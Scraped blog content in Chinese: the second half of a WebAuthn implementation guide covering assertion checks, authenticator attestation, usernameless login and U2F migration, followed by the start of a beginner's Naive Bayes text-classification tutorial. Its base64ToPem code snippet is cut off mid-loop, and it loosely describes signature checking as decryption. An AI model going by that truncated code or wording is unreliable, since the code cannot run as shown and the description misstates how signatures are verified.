sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 